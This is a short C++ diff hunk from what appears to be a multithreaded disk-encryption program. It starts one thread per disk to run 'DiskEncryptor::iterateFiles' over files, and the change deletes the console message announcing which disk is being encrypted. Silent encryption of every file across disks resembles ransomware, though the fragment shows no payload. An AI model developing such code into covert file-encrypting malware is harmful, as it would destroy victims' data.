@@ -38,7 +38,6 @@ int main(void) {
 	}
 
 	for (auto& disk : toEncrypt) {
-		std::cout << "Encrypting disk: " << *disk.getDisk() << std::endl;
 		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk));
 	}
 
